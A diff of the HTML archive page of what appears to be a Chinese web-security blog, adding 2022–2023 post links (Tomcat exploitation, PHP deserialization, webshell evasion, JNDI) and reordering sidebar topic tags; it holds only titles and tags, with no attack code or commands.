+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 155
+        Total : 163
         </div>
         <!-- search  -->
         
@@ -3356,8 +3539,57 @@ top:50vh;
     
     
     
+    <div class="archive-year"> 2023 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/23</span><a class="archive-post-title" href= "/2023/02/23/Despercate-Cat-%E5%B8%A6%E6%9D%A5%E7%9A%84Tomcat%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/" >Despercate Cat 带来的Tomcat利用思路</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
     <div class="archive-year"> 2022 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/02</span><a class="archive-post-title" href= "/2022/10/02/%E5%88%A9%E7%94%A8%E9%93%BE%E7%A5%9E%E5%99%A8-tabby%E4%BD%BF%E7%94%A8/" >利用链神器-tabby使用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/01</span><a class="archive-post-title" href= "/2022/10/01/neo4j%E5%9B%BE%E5%BD%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%94%E8%AE%B0/" >neo4j图形数据库笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/24</span><a class="archive-post-title" href= "/2022/09/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%9D%A2%E6%80%BB%E7%BB%93/" >PHP反序列化利用面总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/22</span><a class="archive-post-title" href= "/2022/09/22/Webshell%E5%85%8D%E6%9D%80%E4%B9%8Bphp/" >Webshell免杀之php(WebShell免杀篇一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/21</span><a class="archive-post-title" href= "/2022/09/21/source-map%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E5%88%A9%E7%94%A8/" >source map源码泄露利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/01</span><a class="archive-post-title" href= "/2022/09/01/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%88%A9%E7%94%A8%E9%9D%A2/" >中间件利用面</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/31</span><a class="archive-post-title" href= "/2022/08/31/java%E5%9F%BA%E7%A1%80%E4%B9%8Bjndi/" >java基础之jndi</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -4069,7 +4301,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/06</span><a class="archive-post-title" href= "/2020/08/06/git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2payload/" >.git源码泄露payload</a>
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href= "/2020/08/06/git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2payload/" >.git源码泄露</a>
         </li>
     
     
@@ -4165,8 +4397,6 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
     
-        <span class="sidebar-tag-name" data-tags="2020CISCN"><span class="iconfont-archer">&#xe606;</span>2020CISCN</span>
-    
         <span class="sidebar-tag-name" data-tags="2021CISCN"><span class="iconfont-archer">&#xe606;</span>2021CISCN</span>
     
         <span class="sidebar-tag-name" data-tags="文件上传"><span class="iconfont-archer">&#xe606;</span>文件上传</span>
@@ -4193,31 +4423,37 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="shtml"><span class="iconfont-archer">&#xe606;</span>shtml</span>
     
+        <span class="sidebar-tag-name" data-tags="2020CISCN"><span class="iconfont-archer">&#xe606;</span>2020CISCN</span>
+    
         <span class="sidebar-tag-name" data-tags="png结构"><span class="iconfont-archer">&#xe606;</span>png结构</span>
     
         <span class="sidebar-tag-name" data-tags="CRC32"><span class="iconfont-archer">&#xe606;</span>CRC32</span>
     
         <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
     
+        <span class="sidebar-tag-name" data-tags="Java安全"><span class="iconfont-archer">&#xe606;</span>Java安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="intro"><span class="iconfont-archer">&#xe606;</span>intro</span>
+    
         <span class="sidebar-tag-name" data-tags="权限提升"><span class="iconfont-archer">&#xe606;</span>权限提升</span>
     
         <span class="sidebar-tag-name" data-tags="Docker"><span class="iconfont-archer">&#xe606;</span>Docker</span>
-    
-        <span class="sidebar-tag-name" data-tags="intro"><span class="iconfont-archer">&#xe606;</span>intro</span>
     
         <span class="sidebar-tag-name" data-tags="CVE"><span class="iconfont-archer">&#xe606;</span>CVE</span>
     
         <span class="sidebar-tag-name" data-tags="Hash"><span class="iconfont-archer">&#xe606;</span>Hash</span>
     
-        <span class="sidebar-tag-name" data-tags="hash长度拓展攻击"><span class="iconfont-archer">&#xe606;</span>hash长度拓展攻击</span>
-    
-        <span class="sidebar-tag-name" data-tags="Java安全"><span class="iconfont-archer">&#xe606;</span>Java安全</span>
-    
         <span class="sidebar-tag-name" data-tags="php_upload_progress_session"><span class="iconfont-archer">&#xe606;</span>php_upload_progress_session</span>
+    
+        <span class="sidebar-tag-name" data-tags="hash长度拓展攻击"><span class="iconfont-archer">&#xe606;</span>hash长度拓展攻击</span>
     
         <span class="sidebar-tag-name" data-tags="红蓝对抗"><span class="iconfont-archer">&#xe606;</span>红蓝对抗</span>
     
         <span class="sidebar-tag-name" data-tags="MySQL"><span class="iconfont-archer">&#xe606;</span>MySQL</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP代码审计"><span class="iconfont-archer">&#xe606;</span>PHP代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
     
         <span class="sidebar-tag-name" data-tags="2021Nep"><span class="iconfont-archer">&#xe606;</span>2021Nep</span>
     
@@ -4235,27 +4471,25 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="nodejs"><span class="iconfont-archer">&#xe606;</span>nodejs</span>
     
-        <span class="sidebar-tag-name" data-tags="PHP代码审计"><span class="iconfont-archer">&#xe606;</span>PHP代码审计</span>
-    
-        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
-    
         <span class="sidebar-tag-name" data-tags="源码泄露"><span class="iconfont-archer">&#xe606;</span>源码泄露</span>
     
         <span class="sidebar-tag-name" data-tags="SSTI"><span class="iconfont-archer">&#xe606;</span>SSTI</span>
     
-        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
-    
         <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
         <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
     
         <span class="sidebar-tag-name" data-tags="JAJA"><span class="iconfont-archer">&#xe606;</span>JAJA</span>
     
-        <span class="sidebar-tag-name" data-tags="机器学习"><span class="iconfont-archer">&#xe606;</span>机器学习</span>
-    
         <span class="sidebar-tag-name" data-tags="XML"><span class="iconfont-archer">&#xe606;</span>XML</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
+    
+        <span class="sidebar-tag-name" data-tags="免杀"><span class="iconfont-archer">&#xe606;</span>免杀</span>
+    
+        <span class="sidebar-tag-name" data-tags="机器学习"><span class="iconfont-archer">&#xe606;</span>机器学习</span>
     
         <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
     
@@ -4347,9 +4581,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="SSRF"><span class="iconfont-archer">&#xe606;</span>SSRF</span>
     
-        <span class="sidebar-tag-name" data-tags="misc_zip"><span class="iconfont-archer">&#xe606;</span>misc_zip</span>
-    
         <span class="sidebar-tag-name" data-tags="url取反绕过"><span class="iconfont-archer">&#xe606;</span>url取反绕过</span>
+    
+        <span class="sidebar-tag-name" data-tags="misc_zip"><span class="iconfont-archer">&#xe606;</span>misc_zip</span>
     
         <span class="sidebar-tag-name" data-tags="create_function注入"><span class="iconfont-archer">&#xe606;</span>create_function注入</span>
     
